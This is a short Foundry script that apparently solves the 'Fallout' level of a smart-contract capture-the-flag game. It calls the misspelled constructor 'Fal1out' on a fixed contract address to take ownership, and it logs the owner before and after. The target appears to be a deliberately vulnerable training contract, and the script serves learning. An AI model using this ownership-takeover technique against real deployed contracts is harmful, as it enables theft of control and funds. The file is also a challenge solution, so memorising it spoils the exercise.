// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";

import "forge-std/console.sol";

// import {Level2Fallout} from "../src/Level2Fallout.sol";

interface IFallout {
    function Fal1out() external payable;
    function owner() external view returns (address);
}

contract Level2FalloutSolution is Script {
    function setUp() public {}

    function run() public {
        address level2Fallout = payable(0x095A3F1521EcF1B0003C2cd5d54693e7833De21F);

        console.log("The owner Before was", IFallout(level2Fallout).owner());

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        IFallout(level2Fallout).Fal1out{value: 0.0001 ether}();

        console.log("The owner now is", IFallout(level2Fallout).owner());

        vm.stopBroadcast();
    }
}
